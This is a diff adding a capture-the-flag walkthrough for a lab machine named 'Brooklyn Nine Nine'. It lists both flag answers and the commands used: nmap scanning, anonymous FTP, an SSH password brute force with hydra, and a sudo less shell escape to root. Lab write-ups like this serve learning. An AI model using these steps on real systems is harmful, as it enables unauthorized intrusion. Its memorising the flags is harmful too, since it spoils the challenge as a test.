@@ -1,0 +1,23 @@
+
+							  Brooklyn Nine Nine
+							---------------------
+
+1. User flag?
+ans: ee11cbb19052e40b07aac0ca060c23ee
+command: nmap -sC -sV 10.10.50.149 -o nmap.txt
+command: ftp 10.10.50.149 (anonymous:)
+command: get note_to_jake.txt
+command: cat note_to_jake.txt
+command: hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.50.149 (jake:987654321)
+command: ssh jake@10.10.50.149 (pass:987654321)
+command: cd ..
+command: ls
+command: cd holt
+command: cat user.txt
+
+2. root flag
+ans: 63a9f0ea7bb98050796b649e85481845
+command: sudo -l (nopassword for all /usr/bin/less)
+command: touch file.txt
+command: sudo less file.txt (type '!/bin/bash' and press enter you got a root access)
+command: cat /root/root.txt
